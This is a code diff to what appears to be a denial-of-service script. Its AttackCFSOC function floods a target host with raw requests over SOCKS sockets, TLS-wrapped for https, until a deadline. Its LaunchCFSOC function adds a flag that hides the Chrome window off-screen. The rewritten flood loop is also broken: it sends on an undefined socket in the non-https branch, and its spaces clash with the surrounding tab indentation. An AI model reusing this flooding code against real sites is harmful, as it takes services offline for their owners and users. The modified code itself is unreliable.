@@ -228,6 +228,7 @@ def LaunchCFSOC(url, th, t):
 	options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36')
 	options.add_argument('--incognito')
 	options.add_argument('--keep-alive-for-test')
+	options.add_argument("--window-position=-5000,0")
 	driver = webdriver.Chrome(options=options)
 	driver.implicitly_wait(3)
 	driver.get(url)
@@ -285,36 +286,23 @@ def LaunchCFSOC(url, th, t):
 			pass
 
 def AttackCFSOC(until_datetime, target, network):
-	while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-		if target['scheme'] == 'https':
-			try:
-				packet = socks.socksocket()
-				packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-				packet.connect((str(target['host']), int(target['port'])))
-				sp = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
-				try:
-					for _ in range(10):
-						sp.send(str.encode(network['raw']))
-						pass
-				except:
-					packet.close()
-					pass
-			except:
-				pass
-		else:
-			try:
-				packet = socks.socksocket()
-				packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-				packet.connect((str(target['host']), int(target['port'])))
-				try:
-					for _ in range(10):
-						packet.send(str.encode(network['raw']))
-						pass
-				except:
-					packet.close()
-					pass
-			except:
-				pass
+    if target['scheme'] == 'https':
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+        sp = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
+    else:
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            for _ in range(10):
+                sp.send(str.encode(network['raw']))
+                pass
+        except:
+            packet.close()
+            pass
 
 #endregion
 
